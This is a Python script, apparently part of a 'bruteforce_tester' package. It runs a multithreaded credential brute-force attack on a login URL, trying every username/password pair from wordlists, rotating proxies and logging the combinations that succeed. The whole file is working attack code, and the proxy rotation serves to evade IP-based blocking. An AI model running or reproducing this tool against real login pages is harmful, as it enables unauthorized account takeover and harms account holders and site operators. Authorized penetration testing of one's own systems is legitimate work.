import logging
import time
import requests

from concurrent.futures import ThreadPoolExecutor
from bruteforce_tester.config import URL, HEADERS, REQUEST_TIMEOUT, PROXY_LIST
from bruteforce_tester.response_analyzer import analyze_response
from bruteforce_tester.wordlist import Wordlist
from bruteforce_tester.proxy_manager import ProxyManager

logging.basicConfig(
    filename="logs/bruteforce.log",
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
    force=True
)

class BruteForceTester:
    def __init__(self, url, headers, proxies=None, max_threads=5):
        self.url = url
        self.headers = headers
        self.wordlist = Wordlist()

        print(f"Loaded {len(self.wordlist.usernames)} usernames and {len(self.wordlist.passwords)} passwords")
        print(f"Proxy list saat inisialisasi: {PROXY_LIST}")

        self.proxy_manager = ProxyManager(proxies) if proxies and len(proxies) > 0 else None
        self.max_threads = max_threads

    def attempt_login(self, username, password):
        proxy = self.proxy_manager.get_next_proxy() if self.proxy_manager else None

        print(f"Using proxy: {proxy}")

        data = {"username": username, "password": password}
        
        try:
            response = requests.post(
                self.url, headers=self.headers, data=data, proxies=proxy,
                timeout=REQUEST_TIMEOUT, allow_redirects=False
            )
            if analyze_response(response):
                logging.info(f"SUCCESS: {username}:{password}")
                print(f"[+] Login Berhasil: {username}:{password}")
                return True
            else:
                logging.info(f"FAILED: {username}:{password}")
                logging.getLogger().handlers[0].flush()
                return False
        except requests.exceptions.RequestException as e:
            logging.error(f"Error: {e}")
            return False

    def start(self):
        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            for username in self.wordlist.usernames:
                for password in self.wordlist.passwords:
                    executor.submit(self.attempt_login, username, password)
                    time.sleep(0.5)  # Hindari request flooding

if __name__ == "__main__":
    tester = BruteForceTester(URL, HEADERS, max_threads=10)
    tester.start()
